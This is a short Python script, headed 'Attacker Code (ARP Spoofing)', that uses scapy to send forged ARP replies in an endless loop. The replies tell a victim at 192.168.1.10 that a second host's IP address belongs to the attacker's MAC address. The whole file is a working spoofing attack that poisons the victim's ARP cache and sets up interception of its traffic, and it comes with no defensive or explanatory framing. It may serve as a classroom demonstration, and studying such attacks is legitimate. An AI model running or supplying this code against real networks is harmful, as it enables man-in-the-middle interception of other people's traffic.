# Attacker Code (ARP Spoofing)
from scapy.all import ARP, send
import time

# The victim (User A) and the legitimate user (User B)
victim_ip = "192.168.1.10"  # IP address of User A (victim)
legitimate_ip = "192.168.1.20"  # IP address of User B (legitimate user)
attacker_mac = "66:77:88:99:AA:BB"  # Attacker's MAC address

# ARP Spoofing: Claim to be User B with Attacker's MAC
def arp_spoof():
    arp_response = ARP(
        pdst=victim_ip,      # Victim's IP (User A)
        hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast (to ensure it reaches User A)
        psrc=legitimate_ip,  # Claiming to be User B's IP
        hwsrc=attacker_mac,  # Attacker's MAC instead of User B's MAC
        op=2  # ARP is-at (response)
    )

    while True:
        send(arp_response, verbose=False)
        print(f"[+] Spoofing User B's IP ({legitimate_ip}) to Victim {victim_ip}")
        time.sleep(2)  # Continuously send spoofed ARP replies

if __name__ == "__main__":
    try:
        arp_spoof()
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")
